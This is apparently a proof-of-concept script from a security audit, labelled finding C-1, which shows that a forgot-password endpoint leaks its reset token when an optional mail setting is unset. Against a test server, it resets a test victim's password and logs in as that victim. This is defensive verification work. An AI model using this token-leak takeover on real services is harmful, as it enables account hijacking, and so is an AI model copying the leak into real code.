// C-1 — password-reset token returned to an unauthenticated caller.
//
// services/accountSecurity.js gates the raw token on `process.env.MAIL_TRANSPORT`
// being *defined*, not on a real transport being configured. When the variable
// is unset (a normal production omission — it is optional and commented in
// .env.example), the token is placed in the HTTP JSON response. lib/config.js
// has no guard for this, so the server starts happily.
//
// Result: anyone who knows a victim's e-mail address takes over the account.
// Run against a server started with MAIL_TRANSPORT unset (see _lib.mjs header).
import { api, newUser, verdict } from './_lib.mjs';

const victim = await newUser('victim');
console.log(`victim=${victim.username} email=${victim.email}`);

// Attacker holds no session — only the address.
const req = await api('POST', '/api/auth/forgot-password', { body: { email: victim.email } });
console.log('forgot-password ->', req.status, JSON.stringify(req.body));
const token = req.body?.dev_token;
if (!token) { verdict(false, 'no token in response (a real MAIL_TRANSPORT is set)'); process.exit(); }

const chosen = 'Attacker-Controlled-1';
const reset = await api('POST', '/api/auth/reset-password', { body: { token, password: chosen } });
console.log('reset-password ->', reset.status, JSON.stringify(reset.body));

const login = await api('POST', '/api/auth/login', { body: { username: victim.username, password: chosen } });
console.log('login as victim ->', login.status, 'id=', login.body?.user?.id);
verdict(login.status === 200 && login.body?.user?.id === victim.id,
  'unauthenticated caller reset the victim password and logged in');
